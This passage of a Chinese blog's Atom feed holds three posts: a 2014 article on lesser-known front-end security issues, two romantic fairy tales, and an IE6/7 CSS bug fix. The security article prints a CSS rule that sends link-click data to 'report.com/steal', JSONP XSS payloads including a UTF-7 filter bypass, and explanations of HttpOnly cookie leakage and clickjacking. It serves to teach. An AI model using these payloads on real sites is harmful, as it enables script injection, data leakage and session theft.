      &lt;p&gt;&lt;img src=&quot;/assets/blogImg/reduce-http.jpg&quot; alt=&quot;沙龙分享&quot;&gt;       &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;最近参加了IMWEB前端技术沙龙活动，有幸能站到讲台上，将性能方面的经验与大家分享。现将“再议减少HTTP请求”部分简单摘剪成文。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="前端" scheme="http://bzkco70.cn/tags/%E5%89%8D%E7%AB%AF/"/>
    
      <category term="html5" scheme="http://bzkco70.cn/tags/html5/"/>
    
      <category term="性能" scheme="http://bzkco70.cn/tags/%E6%80%A7%E8%83%BD/"/>
    
  </entry>
  
  <entry>
    <title>前端安全冷门知识杂谈</title>
    <link href="http://bzkco70.cn/2014/05/27/safety-point-of-view-from-front-end/"/>
    <id>http://bzkco70.cn/2014/05/27/safety-point-of-view-from-front-end/</id>
    <published>2014-05-27T15:52:00.000Z</published>
    <updated>2020-11-28T08:23:00.904Z</updated>
    
    <content type="html"><![CDATA[<h3 id="零、概述"><a href="#零、概述" class="headerlink" title="零、概述"></a>零、概述</h3><p>提起web前端安全，大家都会想到两个名词：<code>xss</code>和<code>csrf</code>。<br>抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。<br>大概分为以下章节：</p><blockquote><p>盗取无法用js读写的Cookie<br>删不掉的本地存储<br>函数覆写监听上报<br>内存Cookie与硬盘Cookie<br>CSS带来的点击量泄露<br>JSONP回调函数与UTF-7编码<br>过滤与代码混淆<br>心理学与社会工程学                  </p></blockquote><p>资料略多，文章较长，请自备瓜子…<br><a id="more"></a></p><h3 id="一、盗取无法用js读写的Cookie"><a href="#一、盗取无法用js读写的Cookie" class="headerlink" title="一、盗取无法用js读写的Cookie"></a>一、盗取无法用js读写的Cookie</h3><p>为了防范xss获取Cookie，网络规范提供了HttpOnly Cookie机制，设置了该标志后，js脚本将无法读写该Cookie。但既然首先是“无法读”，如何“可以读”就成为了个有趣的话题。<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">setcookie(<span class="string">"test"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="number">0</span>); <span class="comment">// 设置普通Cookie</span></span><br><span class="line">setcookie(<span class="string">"test_http"</span>, <span class="number">1</span>, time()+<span class="number">3600</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="number">0</span>, <span class="number">1</span>);<span class="comment">// 第7个参数是HttpOnly 标志，0 为关闭(默认)，1 为开启</span></span><br></pre></td></tr></table></figure></p><p>我们还是可以通过一些服务器上的漏洞去获取它们。</p><h4 id="2-1-调试信息泄露"><a href="#2-1-调试信息泄露" class="headerlink" title="2.1) 调试信息泄露"></a>2.1) 调试信息泄露</h4><p>比较经典的是PHP的phpinfo文件：<br><img src="/assets/blogImg/safety_001.jpg" alt="phpinfo文件"><br>如果在部署服务时，没有删除这个默认的调试信息文件，将泄露服务器信息。其中包括HttpOnly Cookie。<br>访问phpinfo.php，将看到：<br><img src="/assets/blogImg/safety_002.jpg" alt="Alt text"><br>其他的服务器，如python的Django，也有类似的调试信息文件，在外发时要注意清除。                  </p><h4 id="2-2-Apache-2-2-x版本请求头超长泄露"><a href="#2-2-Apache-2-2-x版本请求头超长泄露" class="headerlink" title="2.2) Apache 2.2.x版本请求头超长泄露"></a>2.2) Apache 2.2.x版本请求头超长泄露</h4><p>Cookies最大限制一般为4kb左右，如果请求头长度超过LimitRequestFieldSize，将会引发400错误。在Apache 2.2.x多个版本内，如果引发400(Bad Requerst)错误，会返回出错的请求头内容，这就包含了HttpOnly Cookie。<br>因此，我们可以利用这个漏洞，构造一个超长的请求，让Apache返回400，并用ajax捕获xhr.responseText即可获得HttpOnly Cookie信息。<br><img src="/assets/blogImg/safety_003.jpg" alt="Alt text">                    </p><h3 id="三、删不掉的本地存储"><a href="#三、删不掉的本地存储" class="headerlink" title="三、删不掉的本地存储"></a>三、删不掉的本地存储</h3><p>如果把浏览器理解为一个器官，把恶意标志比方做寄生虫。这标志通过某种途径寄生在了浏览器，并且”永久”寄生，这想想都很可怕。这个标志，可能是植入广告的跟踪标志，或者有其他用处，总之它依附到你的浏览器就删不掉了。<br>但它是如何寄生的呢？又如何做到“永久”？这就涉及到本地存储安全。我们先看下常规的本地存储方案：</p><blockquote><p>Cookie - 是最常见的方式，key-value 模式<br>UserData - IE自己的本地存储，key-value 模式<br>localStorage - HTML5 新增的本地存储，key-value 模式<br>local Database -  HTML5 新增的浏览器本地DataBase，是SQLite 数据库<br>Flash Cookie Flash 的本地共享对象（LSO），key-value 模式，跨浏览器                   </p></blockquote><p>除去这些，我还收集了一些比较“偏门”的存储方案：          </p><blockquote><p>Silverlight的IsolatedStorage - 类似HTML5 localStorage<br>PNG Cache，将Cookie 转换成RGB 值描述形式，以PNG Cache 方式强制缓存着，读入则以HTML5 的canvas 对象读取并还原为原来的Cookie 值<br>HTTP Etags、Web Cache - 本质上都是利用了浏览器缓存机制：浏览器会优先从本地读取缓存的内容<br>Web History，利用的是“CSS 判断目标URL 是否访问过”技巧，比如a标签访问过会显示紫色（新浏览器已fix）<br>window.name，本质就是一个DOM 存储，并不存在本地。                   </p></blockquote><p>老外Samy Kamkar用半天开发了一个JavaScript API：<a href="http://en.wikipedia.org/wiki/Evercookie" target="_blank" rel="noopener">evercookie</a>。<br>该API利用了上面的全部存储手段，将“<code>永不丢失你的cookie</code>”贯彻到底…当evercookie发现用某种机制存储的cookie被数据将删除之后，它将利用其它机制创建的cookie数据来重新创建，让用户几乎不可能删除cookie。</p><h3 id="四、函数覆写监听上报"><a href="#四、函数覆写监听上报" class="headerlink" title="四、函数覆写监听上报"></a>四、函数覆写监听上报</h3><p>覆写函数，可以用于防范？这是网上安全论坛中有人提到的一个偏门要点。其缘由是：<code>搞跨站的人总习惯用alert来确认是否已成功跨站</code>，如果你要监控是否有人在测试你的网站xss的话，可以在你要监控的页面里覆写alert函数，记录alert调用情况。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">    img.src = <span class="string">"http://yousite.com/log.php?caller="</span> + <span class="built_in">encodeURIComponent</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> _alert = alert;</span><br><span class="line"><span class="built_in">window</span>.alert = <span class="function"><span class="keyword">function</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">    log(alert.caller);</span><br><span class="line">    _alert(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如此，就能在有人调用alert时，就执行上报，以供监控。好吧，这里还涉及人的心理学…<br>其实函数覆写无论攻还是防，都应该是我们关注的一个点。相关文章：《<a href="http://www.xfocus.net/articles/200712/963.html" target="_blank" rel="noopener">浅谈javascript函数劫持</a>》。</p><h3 id="五、内存Cookie与硬盘Cookie"><a href="#五、内存Cookie与硬盘Cookie" class="headerlink" title="五、内存Cookie与硬盘Cookie"></a>五、内存Cookie与硬盘Cookie</h3><p><code>内存Cookie</code> - 指没有设置过期时间Expires的Cookie，随浏览器关闭，此Cookie在内存中销毁<br><code>硬盘Cookie</code> - 设置了过期事件Expires的Cookie，常驻硬盘，直到过期</p><p>我们很容易得出结论：内存Cookie更安全。因此，某些站点会把<code>敏感信息放到内存Cookie</code>里面。这原本是没什么风险的，但恰巧会在遇到XSS的时候失控。试想下，XSS攻击者可以给内存Cookie加一个过期时间，使其变为硬盘Cookie，就会在未来很长一段时间内，甚至是永久控制着目标用户的账号权限。                  </p><p>因此，这里有两个关注点：                 </p><ol><li>敏感信息还是不要放Cookie里，即使是内存Cookie；              </li><li>服务器要做Cookie的三个维度的校验 -  唯一性（是否验证通过）、完整性（是否被篡改了）、是否过期。               </li></ol><h3 id="六、CSS带来的点击量泄露"><a href="#六、CSS带来的点击量泄露" class="headerlink" title="六、CSS带来的点击量泄露"></a>六、CSS带来的点击量泄露</h3><p>在我们的印象中，前端安全基本是js带来的问题，但css也会有安全隐患吗？是的。除去IE下的css中执行js代码问题，还有另外一个关注点。<br>假如有一个开源组件，我们只看了下js源码，觉得没有漏洞风险，就直接拿过来使用了。况且，没有前端人员乐于去读别人的css的…但有某种极端的情况，css带来了意想不到的数据泄露。<br>试想这是一个<code>导航栏组件</code>，html代码是这样的：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"http://yousite.com/a1"</span> <span class="attribute">id</span>=<span class="string">"a1"</span>&gt;nav1&lt;/a&gt;</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"http://yousite.com/a2"</span> <span class="attribute">id</span>=<span class="string">"a2"</span>&gt;nav2&lt;/a&gt;</span><br><span class="line">&lt;a <span class="attribute">href</span>=<span class="string">"http://yousite.com/a3"</span> <span class="attribute">id</span>=<span class="string">"a3"</span>&gt;nav3&lt;/a&gt;</span><br></pre></td></tr></table></figure></p><p>你忽略掉的css写成这样：<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#a1</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://report.com/steal?data=a1);&#125;</span><br><span class="line"><span class="selector-id">#a2</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://report.com/steal?data=a2);&#125;</span><br><span class="line"><span class="selector-id">#a3</span><span class="selector-pseudo">:visited</span> &#123;<span class="attribute">background</span>: <span class="built_in">url</span>(http://report.com/steal?data=a3);&#125;</span><br></pre></td></tr></table></figure></p><p>我们用到业务里，用户点击这三个导航后，a标签的visited伪属性生效，就会设置background，而背景的url其实是上报地址。这时候，你的业务的<code>点击数据量</code>就暴露给第三方了！<br>当然，这只针对旧版本浏览器，新版本浏览器都已fix这个问题。可是，HTML5的出现又让这个问题回归了…<br>HTML5提供伪类<code>::selection</code>，当指定对象区域被选择时，就会触发。其原理跟上面类似。                         </p><h3 id="七、JSONP回调函数与UTF-7编码"><a href="#七、JSONP回调函数与UTF-7编码" class="headerlink" title="七、JSONP回调函数与UTF-7编码"></a>七、JSONP回调函数与UTF-7编码</h3><h4 id="7-1-基本原理"><a href="#7-1-基本原理" class="headerlink" title="7.1) 基本原理"></a>7.1) 基本原理</h4><p>在JSONP技术中，服务器通常会让请求方在请求参数中提供callback 函数名，而不是由数据提供方定制，如请求方发起请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=some_function</code><br>返回数据格式为：<br><code>some_function([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br>如果，数据提供方没有对callback函数名做安全过滤，就会带来XSS问题。<br>请求：<br><code>cgi-bin/get_jsonp?id=123&amp;call_back=&lt;script&gt;alert(1);&lt;/script&gt;</code><br>返回：<br><code>&lt;script&gt;alert(1);&lt;/script&gt;([{&#39;id&#39;:123, data:&#39;some_data&#39;}]);</code><br>所以，一般服务器都会对call_back参数进行过滤，但过滤的方法是否会存在漏洞呢？                              </p><h4 id="7-2-IE解析UTF-7漏洞"><a href="#7-2-IE解析UTF-7漏洞" class="headerlink" title="7.2) IE解析UTF-7漏洞"></a>7.2) IE解析UTF-7漏洞</h4><p>比较简单的过滤方法，是过滤<code>&lt;&gt;</code>字符，使得无法构成html标签。但在IE6\IE7的某些版本中，存在以下漏洞：<strong>如果发现文件前面是“+/v8”开头，就把文件当做UTF-7解析</strong>（IE7后续版本已发布补丁修复）。<br>在没被修复的IE版本中，如果我们将上面的请求用utf-7编码。再在前面加上”+/v8”头：<br><code>cgi-bin/get_jsonp?id=123&amp;callback=%2B%2Fv8%20%2BADw-script%2BAD4-alert(1)%2BADw-%2Fscript%2BAD4</code><br>这时候巧妙的躲开了<code>&lt;&gt;</code>过滤，而返回：<br><code>+/v8 +ADw-script+AD4-alert(1)+ADw-/script+AD4({‘id’=&gt;123,data=&gt;’some_data’});</code><br>这时IE将这个jsonp文件当作utf-7解析，依然触发XSS。                       </p><h3 id="八、过滤与代码混淆"><a href="#八、过滤与代码混淆" class="headerlink" title="八、过滤与代码混淆"></a>八、过滤与代码混淆</h3><p>过滤器如果过滤了大部分的js函数，如eval、alert之类，是否就能保证安全呢？必然不是，我们还有强大的js代码混淆手段，可以绕过过滤器。这里推荐一个神奇的网站：<a href="http://utf-8.jp/public/jsfuck.html" target="_blank" rel="noopener">jsfuck</a>。<br>站名如其名，满满的恶意…它可以仅仅用6个字符：<code>[]()!+</code>去混淆编码js。而且兼容性特别的完善。以下是我在最新chrome下的截图，将一句<code>alert(1)</code>编码成了3009个字符，并执行成功：<br><img src="/assets/blogImg/safety_004.jpg" alt="Alt text"><br>所以过滤器仅仅通过适配关键函数名，是不能保证安全性的。</p><h3 id="九、心理学与社会工程学"><a href="#九、心理学与社会工程学" class="headerlink" title="九、心理学与社会工程学"></a>九、心理学与社会工程学</h3><p>有个观点认为“一切钓鱼网站成功案例，都是一次心理学的实战演练”。在这个层面，可谓五花八门，创意百出。分享两个案例：</p><h4 id="9-1）诱导触发拖拽事件"><a href="#9-1）诱导触发拖拽事件" class="headerlink" title="9.1）诱导触发拖拽事件"></a>9.1）诱导触发拖拽事件</h4><p>比方说，有某已知漏洞，要用户触发拖拽事件才能触发。怎么搞定这个事情呢？<br>很简单，添加一张图片：<br><img src="/assets/blogImg/safety_005.jpg" alt="Alt text"><br>注意这是一张图片，滚动条是图片的一部分而不是真正的浏览器控件，用户自然会去下拉“滚动条”，因而触发了这个漏洞。</p><h4 id="9-2-传说中的QQ空间“传染病毒”"><a href="#9-2-传说中的QQ空间“传染病毒”" class="headerlink" title="9.2) 传说中的QQ空间“传染病毒”"></a>9.2) 传说中的QQ空间“传染病毒”</h4><p>步骤是这样的：                    </p><ol><li>A(始作俑者)发布了一条说说：<code>这个网站很好玩，快来试试吧~ http://xxx.xxx</code>                     </li><li>A的好友们看到了，打开了这个链接，玩了一下后，就关闭了页面                     </li><li>好友们不知道，竟然自己的空间主动转发了这条说说（问题是自己没有点转发呀！）                     </li><li>一传十十传百，越传越广…                     </li></ol><p>但真实的情况跟CSRF没一点关系。玄妙在于：<code>好友们打开链接后干了什么事情？</code><br>这个网站是一个小球在跳来跳去，网站上有一句话：你能点到我吗？<br>用户看到后，就很想去点击小球，看会发生什么；但点击后，就转发了说说…                     </p><p>有人会问，这不是CSRF吗？还真不是。做法却很简单：<br>“有趣”的网站内嵌了一个iframe，iframe加载的是这条说说的原页面，然后把“转发”按钮刚好放到小球的位置上，再把这iframe的透明度变为0。所以用户点击小球，其实是<code>点击了iframe中的转发按钮</code>。真是令人万万没想到。                     </p><p>以上。<br>End. 5.27 by litten.                                           </p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;零、概述&quot;&gt;&lt;a href=&quot;#零、概述&quot; class=&quot;headerlink&quot; title=&quot;零、概述&quot;&gt;&lt;/a&gt;零、概述&lt;/h3&gt;&lt;p&gt;提起web前端安全，大家都会想到两个名词：&lt;code&gt;xss&lt;/code&gt;和&lt;code&gt;csrf&lt;/code&gt;。&lt;br&gt;抛去这最常见，最被广泛应用的两者，我想谈谈一些难以觉察的，比较偏门的安全关注点。&lt;br&gt;大概分为以下章节：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;盗取无法用js读写的Cookie&lt;br&gt;删不掉的本地存储&lt;br&gt;函数覆写监听上报&lt;br&gt;内存Cookie与硬盘Cookie&lt;br&gt;CSS带来的点击量泄露&lt;br&gt;JSONP回调函数与UTF-7编码&lt;br&gt;过滤与代码混淆&lt;br&gt;心理学与社会工程学                  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;资料略多，文章较长，请自备瓜子…&lt;br&gt;
    
    </summary>
    
    
      <category term="web" scheme="http://bzkco70.cn/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>失眠故事二【梦中的小偷】【织梦人的表白】</title>
    <link href="http://bzkco70.cn/2013/09/10/my-fairy-tale2/"/>
    <id>http://bzkco70.cn/2013/09/10/my-fairy-tale2/</id>
    <published>2013-09-10T02:55:00.000Z</published>
    <updated>2020-11-28T08:23:00.898Z</updated>
    
    <content type="html"><![CDATA[<p><strong>【梦中的小偷】</strong></p><p>花店的姑娘喜欢他已经很久了，但羞涩的夜雾总是阻隔着她的心事。警察喜欢姑娘也已经很久了，他勇敢正义，在她面前却像小偷一般。每天他们回家时，都会相向经过小巷，这是一条他们都愿意迷失的归途。撑着油纸伞，渐行渐近的，是彼此瑟缩的心跳。姑娘的长发芬芳如兰，飘散如霓，一如晚风扫过梦境，一个不经意的眼神，两人如同触电一般的回避，丘比特躲在墙角呵呵呵的笑…但这个心事，大家都没有说破。<br><a id="more"></a><br>有一天，姑娘来找他，说她遇到了一个小偷，每天都会偷走她的一朵玫瑰。但这个小偷活在她的梦中，每晚睡着时都会出现，问警察能不能帮抓住他。警察神通广大，抓过的小偷不计其数，小到偷糖的有着透明翅膀的蚂蚁，大到喜欢金币的贪婪巨龙，但他着实没有见过梦中的小偷。他还是毫不迟疑的答应了面前低着头的姑娘，缘于内心无与言说的理由。只是，如何才能进入姑娘的梦境是一个巨大的难题。他请教了一切有学识的人，炼金术师，先知，方士，甚至是路过的游吟诗人，最后他被赠与了一瓶毒药——一个神秘的织梦者告诉他，喝掉它就能进入梦境，代价是醒来后会忘掉那个最喜欢的人。</p><p>强烈的爱意使警察奋不顾身，即使只是为她去抓一个小偷，即使醒来就要忘了她。他愿意，让爱情像烟花一样绽放一次。毒药穿肠而过时，他感觉到那是酒的味道，苦涩又甘洌。而姑娘的梦中是一片花的海洋，却没有小偷的身影。他沿着花径一直走，到了尽头，那里是一个清澈的湖，警察往湖水看下去，终于看到了小偷正义的脸庞。姑娘站在远处，澄澈的湖光将她的心事映得通透，她轻轻的告诉他：“你这个该死的小偷，竟偷走了我的心…”</p><p><strong>【织梦人的表白】</strong></p><p>织梦人喜欢在夜里漫游，但没人知道这其中的原因。织梦人知道原因，但他想说出来时，都被人们当作了梦中的呓语。他走路平稳缓慢，仿佛一阵风在缓缓掠过，当午夜的百里香随月光四起，茫茫星图在诉说心事之时，织梦人将脚步放到最慢，独享这静美的时光。他走呀走，等到快要走到夜的尽头，他总会留下一张巨大的梦，像被子一样铺展到人们身上，就此隐去行踪。他是夜的行者，也是梦的主人。</p><p>塘边的一隅花影重重，那是他时常流连的所在，而他喜欢的她，则是这里最美的花仙。短暂的花期使得告白计划略显仓促，而这又是他唯一的机会——七天后随鲜花零落，花仙们将飘散远方，寻找新的花海。织梦人将绵延的情绪写成诗，再编织成了七张有声音的梦。于是在仙子的梦中…</p><p>第一天。他带她听善解人意的雨水，那些叮咚的声响，他说这是春天的表白。<br>第二天。他轻捂她的耳，说这是风的吟唱，正在撩拨开夜的黑发。<br>第三天。他们听到压迫着大地的节奏，那是四处奔跑的小鹿，源源的活力在土地的经脉游走。<br>第四天。他们听见瑟缩的微动，不知是竹子的拔节，还是彼此的心跳？<br>第五天。他让雷声奔流，告诉她需要乐观与勇敢。<br>第六天。他告诉她，月亮在乌云中钻出来时，也会有调皮的笑声。<br>第七天。他让她听到了自己的声音：我爱你…              </p><p>静心设计的表白似乎没有给织梦人带来收获，因为花仙在第二天醒来后，就会忘掉昨日的梦。而不善表达的他，仍然不敢在真实的世界勇敢一次。花仙梦醒时的明媚笑容与织梦人的落寞相映成殇。而就在花仙们离去的黄昏，她却留了下来，她寻到了他，问：趁玫瑰还没凋谢，能替我摘一朵吗？惊喜与不解冲昏了头脑，糊涂的织梦人来不及思考其中的原因——原来慌乱中第七张梦被遗落在家里，第七天的事情是真实的经历。花仙说，无数个梦，不如一个真实的你。从此，织梦人不再织梦。</p><p>——litten 2013.09.10 讲两个爱情故事给谁听？</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;【梦中的小偷】&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;花店的姑娘喜欢他已经很久了，但羞涩的夜雾总是阻隔着她的心事。警察喜欢姑娘也已经很久了，他勇敢正义，在她面前却像小偷一般。每天他们回家时，都会相向经过小巷，这是一条他们都愿意迷失的归途。撑着油纸伞，渐行渐近的，是彼此瑟缩的心跳。姑娘的长发芬芳如兰，飘散如霓，一如晚风扫过梦境，一个不经意的眼神，两人如同触电一般的回避，丘比特躲在墙角呵呵呵的笑…但这个心事，大家都没有说破。&lt;br&gt;
    
    </summary>
    
    
      <category term="故事" scheme="http://bzkco70.cn/tags/%E6%95%85%E4%BA%8B/"/>
    
  </entry>
  
  <entry>
    <title>分享一个IE6，7的CSS hack bug</title>
    <link href="http://bzkco70.cn/2012/12/17/share-a-css-hack/"/>
    <id>http://bzkco70.cn/2012/12/17/share-a-css-hack/</id>
    <published>2012-12-17T11:43:00.000Z</published>
    <updated>2020-11-28T08:23:00.904Z</updated>
    
    <content type="html"><![CDATA[<p>###一、分享一个IE6，7的css hack bug。<br><img src="/assets/blogImg/css_hack.jpg" alt="css hack">   </p><blockquote><p>IE和我们之间，肯定有一个是傻逼，如果它不是，那我们准是。不然很多事情没法解释…  ——多么痛的领悟 </p></blockquote><a id="more"></a><p>先看代码，或者点击看<a href="/assets/demo/hack_demo.html">demo</a><br>html:<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>css:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#main</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#000</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span> <span class="selector-class">.box</span>&#123;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">height</span>: <span class="number">50px</span>;</span><br><span class="line"><span class="attribute">margin-left</span>: <span class="number">10px</span>;</span><br><span class="line"><span class="attribute">position</span>: relative;</span><br><span class="line"><span class="attribute">float</span>: left;</span><br><span class="line"><span class="attribute">background</span>: <span class="number">#333</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#main</span> <span class="selector-class">.box</span><span class="selector-pseudo">:hover</span>&#123;</span><br><span class="line"><span class="attribute">z-index</span>: <span class="number">999</span>;</span><br><span class="line"><span class="comment">/*background: #333;*/</span></span><br><span class="line"><span class="comment">/*background: #999;*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>.box设置了的四行核心代码是：          </p><ul><li><code>float:left</code> - 左浮动         </li><li><code>margin-left: 10px</code> - 左外边距为10px            </li><li><code>position: relative</code> - 因为在box里面想用一个dom做绝对定位            </li><li><code>background: #333</code> - 设置background颜色为#333<br>当.box触发hover时，做了一步z-index的改变，这时候在IE6，7中出现bug：因margin-left失效，.box会向左移动10px；而且这时候设置margin-left是不起作用的，hover结束后.box也不会回到原来的位置。</li></ul><p>###二、淡定解决异次元的bug</p><p>诡异的事情最后水落石出：<strong>background属性居然影响了margin</strong>。</p><p>将.box:hover多加一行background属性，比如：<code>background: #999</code>，这样子在IE上“看上去”就解决了。<br><strong>但是</strong>，就当你以为解决了bug的时候，如果.box:hover的background颜色设置与hover之前的颜色一样，也就是设置为<code>background: #333</code>，阴魂不散的bug又会重新出现啦。</p><p>庆幸你的需求是background颜色不一样吧。如果还真是悲剧到要做成一样的颜色，解决的办法恐怕只能是取消.box的<code>position: relative</code>，然后多加一层dom容器了。<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class="box"&gt;</span><br><span class="line">&lt;div style="position: relative"&gt;…&lt;/div&gt;</span><br><span class="line">…</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></p><p>友情link：<a href="http://xueran.github.com/blog/2012/12/17/csstest-jiugongge/" target="_blank" rel="noopener">xueran的这篇文字</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;###一、分享一个IE6，7的css hack bug。&lt;br&gt;&lt;img src=&quot;/assets/blogImg/css_hack.jpg&quot; alt=&quot;css hack&quot;&gt;   &lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;IE和我们之间，肯定有一个是傻逼，如果它不是，那我们准是。不然很多事情没法解释…  ——多么痛的领悟 &lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="css" scheme="http://bzkco70.cn/tags/css/"/>
    
  </entry>
  
</feed>
